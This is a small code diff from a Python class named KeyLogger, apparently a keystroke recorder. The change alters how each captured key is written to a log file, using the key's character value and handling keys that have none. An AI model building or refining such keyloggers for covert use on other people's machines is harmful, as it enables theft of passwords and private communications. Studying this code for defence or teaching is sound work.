@@ -22,7 +22,7 @@ class KeyLogger():
 
         try:
 
-            file.write(str(key).replace("'",""))
+            file.write(str(key.char).replace("'",""))
 
         except AttributeError:                
 
